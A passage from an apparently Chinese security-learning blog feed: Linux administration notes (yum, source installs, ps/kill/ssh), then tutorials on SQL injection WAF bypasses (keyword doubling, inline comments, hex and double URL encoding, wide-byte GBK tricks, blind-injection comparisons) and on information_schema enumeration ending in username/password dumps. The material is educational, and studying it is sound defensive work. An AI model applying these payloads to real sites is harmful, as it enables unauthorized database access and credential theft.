class="number">1</span>步：setup:使用图形界面配置ip地址</span><br><span class="line">第<span class="number">2</span>步：vi/etc/sysconfig/network-scripts/ifcfg-eth0 把ONBOOT=<span class="string">&quot;no&quot;</span>改为ONBOOT=<span class="string">&quot;yes&quot;</span> <span class="meta">#启动网卡</span></span><br><span class="line">第<span class="number">3</span>步：service network restart :重新启动网络服务。</span><br><span class="line"></span><br><span class="line">二、网络yum源</span><br><span class="line"><span class="number">1.</span> yum源位置：/etc/yum.repos.d/CentOS-Base.repo,这个是默认的网络yum源</span><br><span class="line">　　[<span class="meta">base</span>]    容器名称，一定要放在[]中</span><br><span class="line">　　name  容器说明，可以自己随便写</span><br><span class="line">　　mirrorlist    镜像站点，这个可以注释掉</span><br><span class="line">　　baseurl   我们的yum源服务器的地址，默认是CentOS官方的yum源服务器，是可以使用的，如果你觉得慢可以改成你喜欢的yum源地址</span><br><span class="line">　　enabled   此容器是否生效，如果不写或写成enable=<span class="number">1</span>都是生效，写成enable=<span class="number">0</span>就是不生效</span><br><span class="line">　　gpgcheck  如果是<span class="number">1</span>是指rpm的数字证书生效，如果是<span class="number">0</span>则不生效</span><br><span class="line">　　gpgkey    数字证书的公钥文件保存位置。不用修改。</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> yum命令</span><br><span class="line">　　yum list :获取服务器上所有可用的软件的列表</span><br><span class="line">　　yum search 关键字：搜索服务器上所有和关键字相关的包</span><br><span class="line">　　yum -y install 包名：安装软件包</span><br><span class="line">　　　　install:安装</span><br><span class="line">　　　　-y:自动回答yes</span><br><span class="line">　　yum -y update 包名：升级软件包</span><br><span class="line">　　　　update:升级</span><br><span class="line">　　　　-y:自动回答yes</span><br><span class="line">　　　　如果没有包名，就会升级所有的软件包，包括Linux内核。慎用</span><br><span class="line">　　yum -y <span class="keyword">remove</span> 包名</span><br><span class="line">　　　　<span class="keyword">remove</span>:卸载</span><br><span class="line">　　　　-y:自动回答yes</span><br><span class="line">　　　　注：yum会自动卸载依赖包，而很有可能这个依赖包也被别的包依赖，所以很危险，慎用。</span><br><span class="line"></span><br><span class="line">　　yum grouplist:列出所有可用的软件组列表</span><br><span class="line">　　yum groupinstall 软件组名：安装指定软件组，组名可以由grouplist查询出来 注：如果查询出来的软件组名中间有空格，要使用<span class="string">&quot;&quot;</span>引起来。</span><br><span class="line">　　yum groupremove 软件组名：卸载指定软件组</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> 光盘yum源</span><br><span class="line">　　<span class="number">1</span>) 挂在光盘 mount /dev/sr0 /mnt/cdrom </span><br><span class="line">　　<span class="number">2</span>) 让网络yum源文件失效</span><br><span class="line">　　　　cd /etc/yum.repos.d/</span><br><span class="line">　　　　mv CentOS-Base.repo CentOS-Base.repo.bak</span><br><span class="line">　　　　mv CentOS-Debuginfo.repo CentOS-Debuginfo.repo.bak</span><br><span class="line">　　　　mv Centos-Vault.repo Centos-Vault.repo.bak</span><br><span class="line">　　<span class="number">3</span>) 修改光盘yum源文件</span><br><span class="line">　　　　vim CentOS-Media.repo</span><br><span class="line">　　　　[<span class="meta">c6-media</span>]</span><br><span class="line">　　　　name=CentOS-$releaserver -Media</span><br><span class="line">　　　　baseurl=file:<span class="comment"><span class="doctag">///</span>mnt/cdrom </span></span><br><span class="line">　　　　<span class="meta">#地址为你自己的光盘挂载地址</span></span><br><span class="line">　　　　<span class="meta">#   file:///media/cdrom/</span></span><br><span class="line">　　　　<span class="meta">#   file:///media/cdrecorder/</span></span><br><span class="line">　　　　<span class="meta">#注释这两个不存在的地址</span></span><br><span class="line">　　　　gpgcheck=<span class="number">1</span></span><br><span class="line">　　　　enabled=<span class="number">1</span> <span class="meta">#把enabled=0改为enabled=1，让这个yum配置文件生效</span></span><br><span class="line">　　　　gpgkey=file:<span class="comment"><span class="doctag">///</span>etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6</span></span><br><span class="line"></span><br><span class="line">　　　　注意：注释配置行的时候，<span class="meta">#符号一定要写在开头，不要随便在配置文件某一行后面加注释，也不要随便加空格。</span></span><br><span class="line"></span><br><span class="line">源码包管理</span><br><span class="line">　　<span class="number">1.</span> 区别</span><br><span class="line">　　　　安装之前的区别：概念上的区别</span><br><span class="line">　　　　安装之后的区别：安装位置不同</span><br><span class="line"></span><br><span class="line">　　<span class="number">2.</span> rpm包安装位置(大多数)</span><br><span class="line">　　　　/etc/   配置文件安装目录</span><br><span class="line">　　　　/usr/bin/   可执行的命令安装目录</span><br><span class="line">　　　　/usr/lib/   程序所使用的函数库保存位置</span><br><span class="line">　　　　/usr/share/doc  软件的基本使用书册保存位置</span><br><span class="line">　　　　/usr/share/man/ 帮助文件保存位置    </span><br><span class="line">　　<span class="number">3.</span> 源码包安装位置</span><br><span class="line">　　　　安装在指定位置当中，一般是</span><br><span class="line">　　　　/usr/local/软件名/ </span><br><span class="line">　　<span class="number">4.</span> 安装位置不同带来的影响</span><br><span class="line">　　　　rpm包安装的服务可以使用系统服务管理命令(service)来管理</span><br><span class="line">　　　　例如rpm包安装的Apache的启动方法是：</span><br><span class="line">　　　　/etc/rc.d/<span class="keyword">init</span>.d/httpd start 注：服务的安装路径一般在：/etc/rc.d/<span class="keyword">init</span>.d下</span><br><span class="line">　　　　service httpd start 注：service命令是红帽的专用命令,只能管理rpm包安装的服务</span><br><span class="line">源码包安装过程</span><br><span class="line">　　<span class="number">1.</span> 安装准备</span><br><span class="line">　　　　安装C语言编译器 gcc</span><br><span class="line">　　　　下载源码包</span><br><span class="line">　　　　http:<span class="comment">//mirror.bit.edu.cn/apach/httpd/   </span></span><br><span class="line">　　<span class="number">2.</span> 安装注意事项</span><br><span class="line">　　　　源代码保存位置：/usr/local/src/</span><br><span class="line">　　　　软件安装位置： /usr/local/</span><br><span class="line">　　　　如何确定安装过程报错：</span><br><span class="line">　　　　　　安装过程停止并出现error、warning或no的提示  </span><br><span class="line">　　<span class="number">3.</span> 源码包安装过程</span><br><span class="line">　　　　<span class="number">1</span>)下载源码包</span><br><span class="line">　　　　<span class="number">2</span>)解压缩下载的源码包</span><br><span class="line">　　　　<span class="number">3</span>)进入解压缩目录 注：里面有个INSTALL是系统安装的步骤说明</span><br><span class="line">　　　　<span class="number">4</span>)./configure 软件配置与检查</span><br><span class="line">　　　　　　定义需要的功能选项</span><br><span class="line">　　　　　　检测系统环境是否符合安装要求</span><br><span class="line">　　　　　　把定义好的功能选项和检测系统环境的信息都写入Makefile文件，用于后续的编辑。</span><br><span class="line">　　　　./configure --prefix=/usr/local/apache2 ：定义安装位置 </span><br><span class="line">　　　　<span class="number">5</span>)make :编译</span><br><span class="line">　　　　　　如果前面有错误，则使用make clean命令清楚编译产生的临时文件</span><br><span class="line">　　　　<span class="number">6</span>)make install:编译安装</span><br><span class="line">　　<span class="number">4.</span> 源码包的卸载</span><br><span class="line">　　　　不需要卸载命令，直接删除安装目录即可。不会遗留任何垃圾文件</span><br><span class="line"></span><br><span class="line">脚本安装</span><br><span class="line">　　<span class="number">1.</span> 脚本安装包</span><br><span class="line">　　　　脚本安装包并不是独立的软件包类型，常见安装的是源码包</span><br><span class="line">　　　　是人为把安装过程写成了自动安装的脚本，只要执行脚本，定义简单的参数，就可以完成安装</span><br><span class="line">　　　　非常类似于windows下软件的安装方式</span><br><span class="line">　　<span class="number">2.</span> Webmin的作用</span><br><span class="line">　　　　Webmin是一个基于web的Linux系统管理界面，你就可以通过图形化的方式</span><br><span class="line">　　　　设置用户账号、Apache，DNS、文件共享等服务。</span><br><span class="line">　　<span class="number">3</span>、 webmin安装过程</span><br><span class="line">　　　　<span class="number">1</span>) 下载软件</span><br><span class="line">　　　　　　http;<span class="comment">//sourceforge.net/projects/webadmin/files/webmin/</span></span><br><span class="line">　　　　<span class="number">2</span>) 解压缩，并进入解压缩目录</span><br><span class="line">　　　　<span class="number">3</span>) 执行安装脚本 ./setup.sh</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">其他命令</span><br><span class="line"></span><br><span class="line">du -sh 文件名</span><br><span class="line"></span><br><span class="line">ps 静态查看系统进程，系统默认安装</span><br><span class="line">　　ps -aux 使用BSD语法查看所有进程</span><br><span class="line">　　ps -ef 标准语法查看所有进程</span><br><span class="line">　　　　UID 程序被该 UID 所拥有</span><br><span class="line">　　　　PID 就是这个程序的 ID </span><br><span class="line">　　　　PPID 则是其上级父程序的ID</span><br><span class="line">　　　　C CPU 使用的资源百分比</span><br><span class="line">　　　　STIME 系统启动时间</span><br><span class="line">　　　　TTY 登入者的终端机位置</span><br><span class="line">　　　　TIME 使用掉的 CPU 时间。</span><br><span class="line">　　　　CMD 所下达的指令为何</span><br><span class="line">　　ps -aux --sort -pcpu,-pmem</span><br><span class="line">　　　　根据CPU占用情况和内存占用情况来显示进程</span><br><span class="line">　　watch -n <span class="number">1</span> <span class="string">&#x27;ps -aux --sort -pcpu,-pmem&#x27;</span></span><br><span class="line">　　　　每隔<span class="number">1</span>秒监控一次进程情况</span><br><span class="line"></span><br><span class="line">top 动态查看系统的状态</span><br><span class="line"></span><br><span class="line">lsof -Pti :<span class="number">8000</span></span><br><span class="line">　　通过端口号获得进程pid</span><br><span class="line"></span><br><span class="line">kill <span class="number">-9</span> pid</span><br><span class="line">　　杀死指定pid的进程，强行杀死。</span><br><span class="line"></span><br><span class="line">history</span><br><span class="line">　　查看历史命令</span><br><span class="line"></span><br><span class="line">执行历史命令</span><br><span class="line">　　!! 执行上一条命令</span><br><span class="line">　　!n 执行历史命令的中第n条</span><br><span class="line">　　!-n 执行导数第n条</span><br><span class="line">　　!<span class="built_in">string</span> 执行以<span class="built_in">string</span>开头的历史命令行</span><br><span class="line">　　!?<span class="built_in">string</span>? 执行包含<span class="built_in">string</span>的历史命令行</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">alias</span> </span><br><span class="line">　　给命令起别名</span><br><span class="line"></span><br><span class="line">　　<span class="keyword">alias</span> 命令=<span class="string">&#x27;别名&#x27;</span></span><br><span class="line">　　<span class="keyword">alias</span> -p 查看已存在的别名</span><br><span class="line"></span><br><span class="line">unlias </span><br><span class="line">　　取消别名</span><br><span class="line">　　unlias name</span><br><span class="line"></span><br><span class="line">cal </span><br><span class="line">　　查看某一年的日历，可以是<span class="number">1</span><span class="number">-9999</span>中的任意一年</span><br><span class="line">　　cal <span class="number">88</span></span><br><span class="line"></span><br><span class="line">zcat</span><br><span class="line">　　查看压缩包中的内容</span><br><span class="line"></span><br><span class="line">sed -i <span class="string">&#x27;s#old#new#g&#x27;</span> 文件名</span><br><span class="line">　　使用<span class="keyword">new</span>替换文件中的old</span><br><span class="line"></span><br><span class="line">ssh root@<span class="number">192.168</span><span class="number">.8</span><span class="number">.15</span> <span class="string">&quot;ifconfig&quot;</span></span><br><span class="line">　　远程执行命令</span><br><span class="line"></span><br><span class="line">bash -x 脚本名</span><br><span class="line">　　调试脚本</span><br><span class="line"></span><br><span class="line">centos6上的三个网络配置文件</span><br><span class="line">　　/etc/sysconfig/network-scripts/ifcfg-etho</span><br><span class="line">　　/etc/sysconfig/network</span><br><span class="line">　　/etc/resolv.conf <span class="meta"># dns</span></span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>SQL注入WAF绕过</title>
    <url>/2023/05/03/SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h2 id="SQL注入WAF绕过"><a href="#SQL注入WAF绕过" class="headerlink" title="SQL注入WAF绕过"></a>SQL注入WAF绕过</h2><p>绕过类型：单双引号、空格、关键字、比较（逗号）–》函数&#x2F;关键字替代、注释    </p>
<p>绕过方法：大小写、替换关键字、函数(关键字)、编码&#x2F;进制、sql特性</p>
<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>此类绕过不经常使用，但是用的时候也不能忘了它，他原理是基于SQL语句不分大小写的，但过滤只过滤其中一种。</p>
<h3 id="替换关键字-and"><a href="#替换关键字-and" class="headerlink" title="替换关键字(and)"></a>替换关键字(and)</h3><p>这种情况下大小写转化无法绕过而且正则表达式会替换或删除select、union这些关键字如果只匹配一次就很容易绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.xx.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4</span><br></pre></td></tr></table></figure>

<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注释</span><br><span class="line">select/**/*/**/from/**/yz;</span><br><span class="line"></span><br><span class="line">select%0a*%0afrom%0ayz; %0a 是回车    //%09 %0d</span><br><span class="line"></span><br><span class="line">select(a)from(yz);</span><br><span class="line"></span><br><span class="line">select(a)from(yz)where(a=1);</span><br></pre></td></tr></table></figure>

<h3 id="内联注释-关键字"><a href="#内联注释-关键字" class="headerlink" title="内联注释(关键字)"></a>内联注释(关键字)</h3><p>union select</p>
<p>有些WAF的过滤关键词像&#x2F;union\sselect&#x2F;g，就比如上面说的，很多时候我都是采用内联注释。更复杂的例子需要更先进的方法。比如添加了SQL关键字，我们就要进一步分离这两个词来绕过这个过滤器。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1/*!UnIoN*/SeLeCT</span><br><span class="line">/*!select*//*!**//*!from*//*!yz*/</span><br></pre></td></tr></table></figure>

<h3 id="替换关键字"><a href="#替换关键字" class="headerlink" title="替换关键字"></a>替换关键字</h3><p>这种情况下大小写转化无法绕过而且正则表达式会替换或删除select、union这些关键字如果只匹配一次就很容易绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELselectECT 1,2,3,4</span><br></pre></td></tr></table></figure>

<h3 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h3><p>有时后台界面会再次URL解码所以这时可以利用二次编码解决问题<br>后台语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$insert=$link-&gt;query(urldecode($_GET[&#x27;id&#x27;]));</span><br><span class="line"></span><br><span class="line">$row=$insert-&gt;fetch_row();</span><br><span class="line"></span><br><span class="line">select * from yz</span><br><span class="line"></span><br><span class="line">select * from  %2579%257a</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">不用空格+单双引号的情况下--》查询出用户名为admin的数据</span><br></pre></td></tr></table></figure>

<h3 id="十六进制绕过（引号绕过）-‘’-“”"><a href="#十六进制绕过（引号绕过）-‘’-“”" class="headerlink" title="十六进制绕过（引号绕过） ‘’ 		“”"></a>十六进制绕过（引号绕过） ‘’ 		“”</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select a from yz where b=0x32;</span><br><span class="line"></span><br><span class="line">select * from yz where b=char(0x32);</span><br><span class="line"></span><br><span class="line">select * from yz where b=char(0x67)+char(0x75)+char(0x65)+char(0x73)+char(0x74)</span><br><span class="line"></span><br><span class="line">-------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">select column_name  from information_schema.tables where table_name=&quot;users&quot;</span><br><span class="line"></span><br><span class="line">select column_name  from information_schema.tables where table_name=0x7573657273</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form action=&quot;&quot; method=&quot;get&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; name=&quot;aaa&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;GO&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$str=$_GET[&#x27;aaa&#x27;];</span><br><span class="line"></span><br><span class="line">//$str = &quot;hello world&quot;; // 输入的字符串</span><br><span class="line">$hex = &quot;&quot;; // 用于存储转换后的16进制字符串</span><br><span class="line">for ($i = 0; $i &lt; strlen($str); $i++) &#123;</span><br><span class="line">    $hex .= &quot;CHAR(0X&quot; . dechex(ord($str[$i])) . &quot;)&quot;;</span><br><span class="line">    if ($i != strlen($str) - 1) &#123;</span><br><span class="line">        $hex .= &quot;+&quot;; // 每个字符之间使用+符号分隔</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo $hex; // 输出转换后的16进制字符串</span><br></pre></td></tr></table></figure>

<h3 id="逗号绕过-盲注"><a href="#逗号绕过-盲注" class="headerlink" title="逗号绕过(盲注)"></a>逗号绕过(盲注)</h3><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决。limit 可以使用 offset ;</p>
<p>substr(),mid(),   - &gt; from for</p>
<p>limit -&gt;offset</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substr(),mid()</span><br><span class="line"></span><br><span class="line">mid(user() from 1 for 1)</span><br><span class="line"></span><br><span class="line">substr(user() from 1 for 1)   //substr((payload), 1, 1))</span><br><span class="line"></span><br><span class="line">select substr(user()from -1) from yz ;</span><br><span class="line"></span><br><span class="line">select ascii(substr(user() from 1 for 1)) &lt; 150;</span><br><span class="line"></span><br><span class="line">同时也可以利用替换函数</span><br><span class="line"></span><br><span class="line">select left(database(),2)&gt;&#x27;tf&#x27;;</span><br><span class="line"></span><br><span class="line">selete * from testtable limit 2,1;</span><br><span class="line"></span><br><span class="line">selete * from testtable limit 2 offset 1;</span><br></pre></td></tr></table></figure>

<h3 id="比较符-lt-gt-绕过"><a href="#比较符-lt-gt-绕过" class="headerlink" title="比较符(&lt;,&gt;)绕过"></a>比较符(&lt;,&gt;)绕过</h3><p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。</p>
<p>如果无法使用比较操作符，那么就需要使用到greatest，strcmp来进行绕过了。</p>
<p>greatest</p>
<p>least</p>
<p>strcmp(字符串比较)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GREATEST() 函数用于返回一组值中的最大值，它可以接受两个或多个参数，返回这些参数中的最大值。例如，GREATEST(1,2,3) 将返回 3。</span><br><span class="line"></span><br><span class="line">least() 返回最小值</span><br><span class="line">least(1,2,3) 将返回 1。</span><br><span class="line"></span><br><span class="line">STRCMP() 函数用于比较两个字符串，它接受两个参数，并返回一个表示比较结果的整数值。如果第一个字符串小于第二个字符串，返回负数；如果第一个字符串大于第二个字符串，返回正数；如果两个字符串相等，则返回 0。例如，STRCMP(&#x27;abc&#x27;, &#x27;def&#x27;) 将返回一个负数，而 STRCMP(&#x27;abc&#x27;, &#x27;abc&#x27;) 将返回 0。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64</span><br><span class="line"></span><br><span class="line">select strcmp(left(database(),1),0x32);#lpad(&#x27;asd&#x27;,2,0)</span><br><span class="line"></span><br><span class="line">if(substr(id,1,1)in(0x41),1,3)</span><br><span class="line"></span><br><span class="line">-- 新学习了一种骚骚的注入姿势in、between、order by</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">select * from yz where a in (&#x27;aaa&#x27;);</span><br><span class="line">select substr(a,1,1) in (&#x27;a&#x27;) from yz ;</span><br><span class="line"></span><br><span class="line">select * from yz where a between &#x27;a&#x27; and &#x27;b&#x27;;</span><br><span class="line">select * from yz where a between 0x89 and 0x90;</span><br><span class="line"></span><br><span class="line">select * from yz union select 1,2,3 order by 1;</span><br><span class="line">-- 也可以用like，根据排列顺序进行真值判断</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="注释符绕过"><a href="#注释符绕过" class="headerlink" title="注释符绕过"></a>注释符绕过</h3><p>在注入时的注释符一般为# –当两者不能用时就不能闭合引号<br>这里介绍一个奇淫巧技</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1,2,3 from yz where &#x27;1&#x27;/1=(1=1)/&#x27;1&#x27;=&#x27;1&#x27;</span><br><span class="line"></span><br><span class="line">(1=1)中就有了判断位为下面的注入打下基础</span><br><span class="line"></span><br><span class="line">?id=1&#x27;and &#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=1&#x27;/1=(1=1)/&#x27;1&#x27;=&#x27;1</span><br><span class="line">&#x27;1&#x27;/1=(1=1)=&#x27;1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;$id  &#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">过滤比较符+逗号+空格-》判断users 表中 id=1 的（username）字段 第一个字符是不是‘D’</span><br></pre></td></tr></table></figure>

<h3 id="宽字节绕过"><a href="#宽字节绕过" class="headerlink" title="宽字节绕过"></a>宽字节绕过</h3><p>字节注入也是在最近的项目中发现的问题，大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在%df\’ &#x3D;%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗’，也就是说：%df\’ &#x3D; %df%5c%27&#x3D;縗’，有了单引号就好注入了。</p>
<p>注：select防止用户自定义的名称和mysql保留字冲突</p>
<h3 id="with-rollup"><a href="#with-rollup" class="headerlink" title="with rollup"></a>with rollup</h3><p>一般结合group by使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1 as test from  yz group by test with rollup limit 1 offset 1;</span><br><span class="line"></span><br><span class="line">+------+</span><br><span class="line"></span><br><span class="line">| test |</span><br><span class="line"></span><br><span class="line">+------+</span><br><span class="line"></span><br><span class="line">| NULL |</span><br><span class="line"></span><br><span class="line">+------+</span><br></pre></td></tr></table></figure>

<h3 id="13-无列名注入"><a href="#13-无列名注入" class="headerlink" title="13 无列名注入"></a>13 无列名注入</h3><p>给未知列名起别名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select a from (select 1,2,3 a union select * from yz)v;</span><br></pre></td></tr></table></figure>

<h3 id="14-判断列数绕过"><a href="#14-判断列数绕过" class="headerlink" title="14 判断列数绕过"></a>14 判断列数绕过</h3><p>当order by 被过滤后就可以使用into 变量来绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from yz limit 1,1 into @a,@b,@c;</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>SQL注入基础</title>
    <url>/2023/05/03/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h2 id="SQL注入基础"><a href="#SQL注入基础" class="headerlink" title="SQL注入基础"></a>SQL注入基础</h2><h4 id="SQL注入的产生"><a href="#SQL注入的产生" class="headerlink" title="SQL注入的产生"></a>SQL注入的产生</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。</span><br></pre></td></tr></table></figure>

<h4 id="SQL注入的原理"><a href="#SQL注入的原理" class="headerlink" title="SQL注入的原理"></a>SQL注入的原理</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。</span><br><span class="line">根据相关技术原理，SQL注入可以分为平台层注入和代码层注入。前者由不安全的数据库配置或数据库平台的漏洞所致；后者主要是由于程序员对输入未进行细致地过滤，从而执行了非法的数据查询。基于此，SQL注入的产生原因通常表现在以下几方面：1、不当的类型处理；2、不安全的数据库配置；3、不合理的查询集处理；4、不当的错误处理；5、转义字符处理不合适；6、多个提交处理不当。</span><br></pre></td></tr></table></figure>

<h4 id="SQL注入类型"><a href="#SQL注入类型" class="headerlink" title="SQL注入类型"></a>SQL注入类型</h4><p>UNION query SQL injection     (可联合查询注入)</p>
<p>Error-based SQL injection        (报错型注入)</p>
<p>Boolean-based blind SQL injection  (布尔型注入)</p>
<p>Time-based blind SQL injection  (基于时间延迟注入)</p>
<p>Wide char SQL injection  (宽字节注入)</p>
<p>Twice SQL injection  (二次注入)</p>
<p>Stacked queries SQL injection  (可多语句查询注入) 堆叠注入</p>
<p>Access数据库 &#x3D;&gt;偏移注入</p>
<p>DNSlog  外带注入</p>
<h4 id="mysql函数利用"><a href="#mysql函数利用" class="headerlink" title="mysql函数利用"></a>mysql函数利用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- select database()            查看当前数据库的名称</span><br><span class="line">-- select @@basedir             mysql安装路径</span><br><span class="line">-- select @@datadir             mysql数据存储路径</span><br><span class="line">-- select @@version_compile_os  查看操作系统</span><br><span class="line"></span><br><span class="line">-- select user()</span><br><span class="line">-- select system_user()</span><br><span class="line">-- select session_user()</span><br><span class="line">-- select current_user  查看当前连接的用户名</span><br><span class="line"></span><br><span class="line">-- select version() </span><br><span class="line">-- select @@version 查看当前版本</span><br></pre></td></tr></table></figure>

<h4 id="注释风格"><a href="#注释风格" class="headerlink" title="注释风格"></a>注释风格</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#     (url编码为%23)</span><br><span class="line">--  或者--+  (--后边要跟上一个或多个空格)(+号在浏览器会被解析成空格)</span><br><span class="line">/*....*/  内联注释</span><br><span class="line"></span><br><span class="line">/*!*/ 这个没有任何意义，只是干扰，select</span><br><span class="line">/*!@@version*/</span><br><span class="line"></span><br><span class="line">select*/*!22222from*/ users;</span><br><span class="line">如果数字(5位) 大于当前mysql版本号 注释生效否则不生效 (绕过waf)</span><br></pre></td></tr></table></figure>

<h4 id="数据库-information-schema"><a href="#数据库-information-schema" class="headerlink" title="数据库:information_schema"></a>数据库:information_schema</h4><p>(存储所有数据库&#x2F;表&#x2F;字段的名称信息)</p>
<p>SCHEMATA表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">字段：SCHEMA_NAME （存储所有数据库的名称）</span><br></pre></td></tr></table></figure>

<p>TABLES表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">字段：TABLE_SCHEMA,TABLE_NAME（存储所有表的名称）</span><br></pre></td></tr></table></figure>

<p>COLUMNS表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">字段：TBALE_SCHEMA,TABLE_NAME,COLUMN_NAME（存储所有的字段名）</span><br></pre></td></tr></table></figure>

<h4 id="获取数据库名称"><a href="#获取数据库名称" class="headerlink" title="获取数据库名称"></a>获取数据库名称</h4><p> limit 一个一个打印出来库名<br> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1</span><br></pre></td></tr></table></figure></p>
<p> group_concat 一次性全部显示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</span><br></pre></td></tr></table></figure>

<h4 id="列出-数据库：test-中所有的表"><a href="#列出-数据库：test-中所有的表" class="headerlink" title="列出(数据库：test)中所有的表"></a>列出(数据库：test)中所有的表</h4><p> limit 一个一个打印出来字段名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&#x27;test&#x27; limit 0,1</span><br></pre></td></tr></table></figure>

<p> group_concat 一次性全部显示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=0x674657374</span><br></pre></td></tr></table></figure>

<p>注意:数据库名称可以用十六进制来代替字符串，这样可以绕过单引号的限制。</p>
<h4 id="列出（数据库：test-表：admin-）中所有的字段"><a href="#列出（数据库：test-表：admin-）中所有的字段" class="headerlink" title="列出（数据库：test 表：admin ）中所有的字段"></a>列出（数据库：test 表：admin ）中所有的字段</h4><p> limit 一个一个打印出来<br> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA=&#x27;test&#x27; and TABLE_NAME=&#x27;t10&#x27; limit 0,1</span><br></pre></td></tr></table></figure></p>
<p> group_concat 一次性全部显示</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA=0x74657374 and TABLE_NAME=0x61646d696e</span><br></pre></td></tr></table></figure>

<h4 id="列出（数据库：test-表：admin-）中的数据"><a href="#列出（数据库：test-表：admin-）中的数据" class="headerlink" title="列出（数据库：test 表：admin ）中的数据"></a>列出（数据库：test 表：admin ）中的数据</h4><p>limit 一个一个打印出来<br> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select username,passwd from test.admin limit 0,1</span><br></pre></td></tr></table></figure></p>
<p>group_concat 把 一次性全部打印</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select group_concat(concat(username,0x3D,password)) from security.users</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>SSRF服务器端请求伪造</title>
    <url>/2023/05/03/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</url>
